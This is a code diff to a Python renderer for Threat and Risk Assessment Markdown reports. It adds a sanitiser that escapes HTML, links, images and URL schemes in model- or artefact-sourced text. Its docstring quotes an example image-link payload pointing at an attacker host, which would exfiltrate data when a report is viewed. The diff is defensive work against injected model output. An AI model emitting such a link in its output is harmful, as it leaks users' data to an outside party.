@@ -15,6 +15,21 @@ def _safe(text: str) -> str:
     return re.sub(r'["<>\[\]{}|]', " ", text).strip()
 
 
+def _md(text: str | None) -> str:
+    """Model- or artefact-sourced text for a Markdown cell or paragraph.
+
+    Neutralises what a reader's renderer would act on: raw HTML, images and
+    links (a `![](https://attacker/?q=...)` in a rationale would leak data when
+    the report is viewed), and table-breaking pipes and newlines.
+    """
+    if not text:
+        return ""
+    text = text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
+    text = re.sub(r"([\[\]!|`])", r"\\\1", text)
+    text = re.sub(r"(?i)\b(https?|ftp|data|javascript)://", r"\1:&#47;&#47;", text)
+    return re.sub(r"\s*\n\s*", " ", text).strip()
+
+
 def _abbrev(label: str) -> str:
     return {"OFFICIAL_SENSITIVE": "OS", "OFFICIAL": "O", "PROTECTED": "P"}.get(label, label)
 
@@ -52,7 +67,7 @@ def mermaid_dfd(model: SystemModel) -> str:
 def render(tra: TRA, reference: Reference) -> str:
     out: list[str] = []
     w = out.append
-    w(f"# Threat and Risk Assessment: {tra.title}\n")
+    w(f"# Threat and Risk Assessment: {_md(tra.title)}\n")
     w(f"**{tra.classification.label}**\n")
     w("| Field | Value |\n|---|---|")
     w(f"| TRA reference | {tra.id} (version {tra.version}) |")
@@ -67,11 +82,11 @@ def render(tra: TRA, reference: Reference) -> str:
 
     if tra.intake:
         w("## 1. Scope\n")
-        w(tra.intake.summary + "\n")
+        w(_md(tra.intake.summary) + "\n")
         if tra.intake.missing_information:
             w("**Information the artefacts did not provide:**\n")
             for m in tra.intake.missing_information:
-                w(f"- {m}")
+                w(f"- {_md(m)}")
             w("")
 
     w("## 2. Artefacts assessed\n")
@@ -83,23 +98,23 @@ def render(tra: TRA, reference: Reference) -> str:
     if tra.system_model:
         m = tra.system_model
         w("## 3. System model\n")
-        w(m.summary + "\n")
+        w(_md(m.summary) + "\n")
         w("```mermaid\n" + mermaid_dfd(m) + "\n```\n")
         w("Thick arrows cross a trust boundary. Dashed outlines are AI components. O = OFFICIAL, OS = OFFICIAL: Sensitive.\n")
         w("| Flow | From | To | Data | Classification | Protocol | Authenticated | Encrypted |\n|---|---|---|---|---|---|---|---|")
         yn = {True: "yes", False: "no", None: "unknown"}
         for f in m.flows:
-            w(f"| {f.id} | {f.source} | {f.target} | {f.data} | {f.classification.label} | {f.protocol or ''} | {yn[f.authenticated]} | {yn[f.encrypted]} |")
+            w(f"| {f.id} | {f.source} | {f.target} | {_md(f.data)} | {f.classification.label} | {_md(f.protocol)} | {yn[f.authenticated]} | {yn[f.encrypted]} |")
         w("\n| Asset | Kind | Classification | C / I / A |\n|---|---|---|---|")
         for a in m.assets:
-            w(f"| {a.id} {a.name} | {a.kind} | {a.classification.label} | {a.confidentiality} / {a.integrity} / {a.availability} |")
+            w(f"| {a.id} {_md(a.name)} | {_md(a.kind)} | {a.classification.label} | {a.confidentiality} / {a.integrity} / {a.availability} |")
         w("")
 
     if tra.threats:
         w("## 4. Threats\n")
         w("| ID | Element | STRIDE | ATLAS | Library | Threat |\n|---|---|---|---|---|---|")
         for t in tra.threats:
-            w(f"| {t.id} | {t.element_id} | {''.join(s.value for s in t.stride)} | {', '.join(t.atlas)} | {t.library_ref or ''} | {t.statement} |")
+            w(f"| {t.id} | {t.element_id} | {''.join(s.value for s in t.stride)} | {', '.join(t.atlas)} | {t.library_ref or ''} | {_md(t.statement)} |")
         w("")
 
     if tra.controls:
@@ -109,7 +124,7 @@ def render(tra: TRA, reference: Reference) -> str:
             cc = reference.controls.get(c.control_id)
             refs = "; ".join(f"{k} {', '.join(v)}" for k, v in cc.references().items()) if cc else ""
             title = f"{c.control_id} {cc.title}" if cc else c.control_id
-            w(f"| {title} | {c.status.value.replace('_', ' ')} | {', '.join(c.threat_ids)} | {refs} | {c.evidence} |")
+            w(f"| {title} | {c.status.value.replace('_', ' ')} | {', '.join(c.threat_ids)} | {refs} | {_md(c.evidence)} |")
         w("")
 
     if tra.risks:
@@ -118,13 +133,13 @@ def render(tra: TRA, reference: Reference) -> str:
         w("| Risk | Inherent | Residual | Treatment | Acceptance authority |\n|---|---|---|---|---|")
         for r in risks:
             w(
-                f"| {r.id}: {r.statement} | {r.inherent_rating.value} (L{r.inherent_likelihood} I{r.inherent_impact}) "
+                f"| {r.id}: {_md(r.statement)} | {r.inherent_rating.value} (L{r.inherent_likelihood} I{r.inherent_impact}) "
                 f"| **{r.residual_rating.value}** (L{r.residual_likelihood} I{r.residual_impact}) | {r.treatment.value} "
                 f"| {AUTHORITY[r.residual_rating].who_may_accept} |"
             )
         w("")
         for r in risks:
-            w(f"**{r.id} rationale.** {r.rationale} *Cites: {', '.join(r.citations)}.*")
+            w(f"**{r.id} rationale.** {_md(r.rationale)} *Cites: {_md(', '.join(r.citations))}.*")
             if r.proposed_controls:
                 w(f" Proposed controls: {', '.join(r.proposed_controls)}.")
             w("")
@@ -133,14 +148,14 @@ def render(tra: TRA, reference: Reference) -> str:
         w("## 7. Quality review findings\n")
         w("| Severity | Where | Issue | Source |\n|---|---|---|---|")
         for i in tra.critique.issues:
-            w(f"| {i.severity} | {i.where} | {i.issue} | {i.source} |")
+            w(f"| {i.severity} | {_md(i.where)} | {_md(i.issue)} | {i.source} |")
         w("")
 
     if tra.gates:
         w("## 8. Gate decisions\n")
         w("| Gate | Decision | By | Role | When | Rationale |\n|---|---|---|---|---|---|")
         for g in tra.gates:
-            w(f"| {g.gate.value} | {g.decision} | {g.by} | {g.role} | {g.at:%Y-%m-%d %H:%M} UTC | {g.rationale} |")
+            w(f"| {g.gate.value} | {g.decision} | {g.by} | {g.role} | {g.at:%Y-%m-%d %H:%M} UTC | {_md(g.rationale)} |")
         w("")
 
     w(f"\n**{tra.classification.label}**")
